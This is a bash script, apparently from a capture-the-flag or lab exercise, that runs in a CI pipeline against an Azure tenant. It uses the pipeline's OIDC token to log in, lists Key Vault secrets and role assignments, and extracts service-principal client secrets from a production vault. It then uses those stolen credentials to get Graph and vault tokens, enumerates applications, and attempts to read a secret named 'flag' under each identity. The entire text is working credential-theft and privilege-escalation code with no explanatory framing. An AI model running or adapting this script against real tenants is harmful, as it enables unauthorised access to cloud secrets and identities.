#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
PLATFORM_RG="rg-tbl-platform-prod-sea"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

echo "=== LIST KV SEC SECRET NAMES VIA ARM (cicd-deployer has Reader) ==="
curl -sS \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/$PLATFORM_RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2022-07-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err:
    print("ERR:", err.get("code",""), err.get("message","")[:500])
else:
    secrets=d.get("value",[])
    print("Found", len(secrets), "secrets:")
    for s in secrets:
        name=s.get("id","").split("/secrets/")[-1].split("/")[0]
        attrs=s.get("attributes",{})
        print(f"  {name} enabled={attrs.get(\"enabled\")} created={attrs.get(\"created\")}")
' 2>/dev/null

echo ""
echo "=== PER-SECRET RBAC ON KV SEC SECRETS ==="
# Try to list role assignments on the flag secret directly
for SNAME in flag tbl-reporting-insights-secret tbl-directory-sync-secret reporting-insights directory-sync config-key deploy-key; do
    echo "--- /secrets/$SNAME role assignments ---"
    curl -sS \
      "$ARM_BASE/subscriptions/$SUB/resourceGroups/$PLATFORM_RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets/$SNAME/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
      -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    vals=d.get("value",[])
    print("  assignments:", len(vals))
    for r in vals:
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        pid=r["properties"]["principalId"]
        print(f"    role={role[:8]} principal={pid[:8]}")
' 2>/dev/null
done

echo ""
echo "=== tbl-reporting-insights APP DETAILS VIA GRAPH ==="
DA_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null)
DA_CID=$(echo "$DA_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
DA_SEC=$(echo "$DA_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
DA_GRAPH=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))' 2>/dev/null)

echo "--- tbl-reporting-insights app registration details ---"
curl -sS "https://graph.microsoft.com/v1.0/applications?filter=appId+eq+'6eb124e3-e4ca-4a3c-8a23-f42e4a3b7e7b'" \
  -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for a in d.get("value",[]):
    print("displayName:", a.get("displayName"))
    print("appId:", a.get("appId"))
    print("id:", a.get("id"))
    creds=a.get("passwordCredentials",[]) or []
    print("passwordCredentials:", len(creds))
    for c in creds:
        print("  hint:", c.get("hint",""), "displayName:", c.get("displayName",""), "endDateTime:", c.get("endDateTime",""))
    api_perms=a.get("requiredResourceAccess",[]) or []
    print("API permissions count:", len(api_perms))
' 2>/dev/null

# Get full list of apps with appId (not just first 8 chars)
echo ""
echo "--- Full app listing with complete IDs ---"
curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=id,appId,displayName,passwordCredentials,requiredResourceAccess&\$top=30" \
  -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for a in d.get("value",[]):
    name=a.get("displayName","")
    if "tbl" in name.lower() or "reporting" in name.lower() or "legacy" in name.lower():
        print("name:", name)
        print("  appId:", a.get("appId"))
        print("  oid:", a.get("id"))
        creds=a.get("passwordCredentials",[]) or []
        print("  creds:", len(creds), [(c.get("hint",""), c.get("displayName",""), c.get("endDateTime","")) for c in creds])
        for rr in (a.get("requiredResourceAccess",[]) or []):
            print("  api resource:", rr.get("resourceAppId"), [x.get("id") for x in rr.get("resourceAccess",[])])
' 2>/dev/null

echo ""
echo "--- tbl-reporting-insights SP roles ---"
# SP OID for tbl-reporting-insights (from build19 listing first 8 chars: 317eef12)
# Need full OID - look it up
RI_SP=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?filter=appId+eq+'6eb124e3-e4ca-4a3c-8a23-f42e4a3b7e7b'&\$select=id,appId,displayName,appRoleAssignments" \
  -H "Authorization: Bearer $DA_GRAPH" 2>/dev/null)
echo "$RI_SP" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    for sp in d.get("value",[]):
        print("SP OID:", sp.get("id"))
        print("AppId:", sp.get("appId"))
        print("displayName:", sp.get("displayName"))
' 2>/dev/null

echo ""
echo "=== LIST ALL SPS WITH FULL OIDs ==="
curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=id,appId,displayName&\$filter=startswith(displayName,'tbl-')" \
  -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    for sp in d.get("value",[]):
        print(sp.get("id"), sp.get("appId"), sp.get("displayName"))
' 2>/dev/null

echo ""
echo "=== CHECK KV SEC WITH COST-READER TOKEN ==="
CR_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name cost-reader-principal 2>/dev/null)
CR_CID=$(echo "$CR_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
CR_SEC=$(echo "$CR_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
CR_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CR_CID" --data-urlencode "client_secret=$CR_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR"))' 2>/dev/null)
echo "cost-reader vault token len=${#CR_VT}"

echo "--- cost-reader on KV sec ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $CR_VT" | head -c 1000

echo ""
echo "--- Try reading flag directly as cost-reader ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
  -H "Authorization: Bearer $CR_VT" | head -c 500

echo ""
echo "=== REPORTING-VIEWER ON KV SEC ==="
RV_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-viewer-principal 2>/dev/null)
RV_CID=$(echo "$RV_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RV_SEC=$(echo "$RV_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RV_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR"))' 2>/dev/null)
echo "reporting-viewer vault token len=${#RV_VT}"
echo "--- reporting-viewer on KV sec list ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $RV_VT" | head -c 1000
echo "--- reporting-viewer on KV sec flag ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
  -H "Authorization: Bearer $RV_VT" | head -c 500

echo ""
echo "=== CHECK cicd-deployer ON KV SEC DATA PLANE ==="
VT=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv 2>/dev/null)
echo "cicd-deployer vault token len=${#VT}"
echo "--- cicd-deployer list KV sec ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $VT" | head -c 1000
echo "--- cicd-deployer get flag ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
  -H "Authorization: Bearer $VT" | head -c 500

echo "DONE"
